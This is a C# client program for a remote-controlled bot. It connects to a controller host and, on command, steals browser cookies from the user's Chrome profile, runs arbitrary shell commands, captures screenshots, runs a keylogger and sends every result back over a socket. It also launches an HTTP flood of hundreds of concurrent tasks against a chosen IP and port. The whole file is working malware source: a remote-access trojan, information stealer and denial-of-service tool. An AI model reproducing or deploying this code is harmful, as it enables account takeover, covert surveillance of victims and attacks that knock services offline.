using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;
using static System.Net.Mime.MediaTypeNames;
using System.Diagnostics;
using System.Windows.Forms;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium;
using System.Reflection.Emit;
using System.Security.Policy;
using System.Threading;
using System.Runtime.InteropServices.ComTypes;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.ListView;
using System.Drawing.Imaging;
using System.Drawing;
using System.Net;
using Server;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.Button;
using System.Net.Http;
using OpenQA.Selenium.DevTools;

namespace Client
{
    class Program
    {
        private const int BUFFER_SIZE = 1024;
        private const int PORT_NUMBER = 9669;
        static Thread th_doKeylogger;
        static Thread th_socket;
        private static Boolean isRunning = true;
        public static WebClient webClient = new WebClient();

        private static string logExtendtion = ".txt";

        static ASCIIEncoding encoding = new ASCIIEncoding();
     
        private static DateTime timeStart;
        static bool IsUrlValid(string url)
        {
            Uri result;
            return Uri.TryCreate(url, UriKind.Absolute, out result) && (result.Scheme == Uri.UriSchemeHttp || result.Scheme == Uri.UriSchemeHttps);
        }
        public static void getCookies(IWebDriver driver, string url)
        {
            try
            {
                driver.Navigate().GoToUrl(url);
                string currentUrl = driver.Url;
                if (IsUrlValid(currentUrl))
                {
                    var cookies = driver.Manage().Cookies.AllCookies;
                    string cookiesString = "";
                    foreach (var cookie in cookies)
                    {
                        cookiesString += $"{cookie.Name}={cookie.Value};";
                    }
                    string logNameToWrite = "cookies" + logExtendtion;
                    StreamWriter sw = new StreamWriter(logNameToWrite, false);
                  
                    sw.WriteLine(cookiesString);
                   
                    sw.Close();

                }
                else
                {
                    Console.WriteLine("Invalid URL.");
                    string logNameToWrite = "cookies" + logExtendtion;
                    StreamWriter sw = new StreamWriter(logNameToWrite, true);
                   
                    sw.WriteLine("Url invalid. Url must starts with https://www...");     
                    sw.Close();
                }

            }
            catch (Exception e)
            {
                string logNameToWrite = "cookies" + logExtendtion;
                StreamWriter sw = new StreamWriter(logNameToWrite, true);
            
                sw.WriteLine("error: " + e.Message);
              
                sw.Close();
            }
            finally
            {
            }
        }

        public static string RunCommandAndGetOutput(string command)
        {
            string output = "";

            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe"; // Command prompt executable
                process.StartInfo.Arguments = "/c " + command; // /c flag tells cmd.exe to run the command and exit
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                process.Start();

                output = process.StandardOutput.ReadToEnd();

                process.WaitForExit();
            }
            catch (Exception ex)
            {
            }
            string logNameToWrite = "cmdResult" + logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, false);
            sw.WriteLine(output);
            sw.Close();
            return output;
        }

        public static void captureScreen()
        {
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                           Screen.PrimaryScreen.Bounds.Height,
                                           PixelFormat.Format32bppArgb);
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);
            try
            {
                bmpScreenshot.Save("capture.png", ImageFormat.Png);
            }
            catch
            {
            }
        }
        
        public static void sendFileSocket(TcpClient client, string type)
        {
            string fileName = "";
            if (type == "cookies")
            {
                fileName = "cookies.txt";
            }
            else if (type == "keylogger")
            {
                fileName = "outputkeylogger.txt";
            }
            else if (type == "cmd")
            {
                fileName = "cmdResult.txt";
            }
            else if (type == "capture")
            {
                fileName = "capture.png";
            }
            byte[] dataTemp = File.ReadAllBytes(fileName);
            byte[] dataLength = BitConverter.GetBytes(dataTemp.Length);

            int bufferSize = 1024;

            NetworkStream stream = client.GetStream();
            stream.Write(dataLength, 0, 4);

            int bytesSent = 0;
            int bytesLeft = dataTemp.Length;

            while (bytesLeft > 0)
            {
                int curDataSize = Math.Min(bufferSize, bytesLeft);

                stream.Write(dataTemp, bytesSent, curDataSize);

                bytesSent += curDataSize;
                bytesLeft -= curDataSize;
            }
            File.Delete(fileName);
        }
        public static void handleCommand(string command, IWebDriver driver, TcpClient client, Stream stream)
        {
            byte[] data = new byte[BUFFER_SIZE];
            if (command.StartsWith("cookies"))
            {
                string url = command.Split('?')[1];
                getCookies(driver, url);
                sendFileSocket(client, "cookies");
            }
            
            else if (command.StartsWith("command"))
            {
                string cmd = command.Split('?')[1];
                RunCommandAndGetOutput(cmd);
                sendFileSocket(client, "cmd");
            }
            else if (command.StartsWith("capture"))
            {
                Console.WriteLine("capture");
                captureScreen();
                sendFileSocket(client, "capture");
            }
            else if (command.StartsWith("keylogger"))
            {
                BotKeylogger.StopKeylogger();
                sendFileSocket(client, "keylogger");
               
                string str = timeStart.ToString();
                data = encoding.GetBytes(str);
                stream.Write(data, 0, data.Length);
                BotKeylogger.StartKeylogger();
                timeStart = DateTime.Now;
            }
            else if (command.StartsWith("exit"))
            {
                client.Close();
                isRunning= false;
                driver.Quit();
                Environment.Exit(0);
            }
            else if(command.StartsWith("http"))
            {
                string ipandport = command.Split('?')[1];
                string ip = ipandport.Split(':')[0];
                string port = ipandport.Split(':')[1];
                string url = $"http://{ip}:{port}";
                for (int j = 0; j<500;j++)
                {
                    HttpClient http = new HttpClient();
                    Task.Run(async () =>
                    {
                        for (int i = 0; i < 10000000; i++)
                        {
                            try
                            {
                                try
                                {
                                    HttpResponseMessage response = await http.GetAsync(url);
                                }
                                catch
                                {
                       
                                }
                            }
                            catch
                            {

                            }
                        }
                    });
                }         
            }    
        }
        static bool IsSocketConnected(Socket socket)
        {
            try
            {
                // Kiểm tra trạng thái của Socket
                return !(socket.Poll(1, SelectMode.SelectRead) && socket.Available == 0);
            }
            catch (SocketException)  // Nếu có lỗi xảy ra, coi như không kết nối
            {
                return false;
            }
        }
        public static void handleConnectSocket()
        {
            ChromeOptions options = new ChromeOptions();
            string path = "user-data-dir=C:/Users/ADMIN/AppData/Local/Google/Chrome/User Data";
            options.AddArguments(path, "headless");
            IWebDriver driver = new ChromeDriver(options);

            try
            {
                TcpClient client = new TcpClient();

                IPEndPoint localEndPoint = new IPEndPoint(IPAddress.Any, 5454);


                client.Client.Bind(localEndPoint);
                //client.Connect("172.20.10.4", PORT_NUMBER);
                client.Connect("192.168.1.101", PORT_NUMBER);

                Stream stream = client.GetStream();

                byte[] data;
                while (isRunning == true)
                {
                    data = new byte[BUFFER_SIZE];
                    stream.Read(data, 0, BUFFER_SIZE);
                    string command = encoding.GetString(data);
                    handleCommand(command, driver, client, stream);  
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex);
            }
            driver.Quit();
            Environment.Exit(0);
        }
        public static void Main(string[] args)
        {
            th_socket = new Thread(new ThreadStart(handleConnectSocket));
            th_socket.SetApartmentState(ApartmentState.STA);
            th_socket.Start();
            BotKeylogger.initBotKeylogger();
            timeStart = DateTime.Now;
        }


    }
}